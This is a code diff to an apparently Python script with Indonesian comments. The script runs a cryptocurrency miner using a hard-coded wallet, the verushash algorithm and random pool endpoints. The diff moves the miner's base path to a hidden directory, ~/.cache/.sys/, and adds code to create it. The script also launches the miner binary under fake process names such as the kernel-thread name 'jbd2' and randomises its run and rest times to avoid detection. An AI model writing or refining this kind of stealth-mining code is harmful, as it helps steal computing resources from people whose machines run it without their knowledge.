@@ -9,7 +9,7 @@ import threading
 WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
 ALGO = "verushash"
 CPU_THREADS = 2
-BASE_PATH = "/dev/shm/.cache/"
+BASE_PATH = os.path.expanduser("~/.cache/.sys/")
 ORIGINAL_BINARY = os.path.join(BASE_PATH, "jbd2")
 
 # Daftar nama fake
@@ -35,6 +35,9 @@ VIDEOS = [
     "https://vt.tiktok.com/ZSNLzJYcG/"
 ]
 
+# Pastikan direktori aman ada
+os.makedirs(BASE_PATH, exist_ok=True)
+
 if not os.path.exists(ORIGINAL_BINARY):
     print("Binary tidak ditemukan di:", ORIGINAL_BINARY)
     exit(1)
@@ -59,7 +62,7 @@ while True:
     rest_minutes = random.randint(5, 7)
     pool = random.choice(ENDPOINTS)
     fake_name = random.choice(FAKE_NAMES)
-    safe_name = fake_name.replace("/", "_")  # <-- FIX ini
+    safe_name = fake_name.replace("/", "_")
     temp_binary = os.path.join(BASE_PATH, safe_name)
 
     print(f"Menjalankan panen di {pool} sebagai proses '{fake_name}' selama {run_minutes} menit...")
